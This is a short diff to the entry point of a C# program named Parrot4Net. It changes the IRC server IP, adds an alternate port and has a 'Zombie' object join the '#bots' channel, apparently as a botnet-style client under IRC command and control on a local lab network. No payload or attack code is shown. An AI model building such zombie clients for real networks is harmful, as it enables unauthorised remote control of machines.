@@ -1,10 +1,4 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using System.Threading;
-using Meebey.SmartIrc4net;
+﻿using System.Collections.Generic;
 
 namespace Parrot4Net
 {
@@ -12,11 +6,12 @@ namespace Parrot4Net
     {
         static void Main(string[] args)
         {
-            string server = "192.168.1.3";
+            string server = "192.168.78.141";
             int port = 6667;
+            int alterport = 6669;
             string channel = "#bots";
-            Zombie z = new Zombie();
-            z.ConnectAndListen(server, port, channel);
+            Zombie z = new Zombie(server, port, alterport, channel);
+            z.ConnectAndListen();
         }
     }
 }
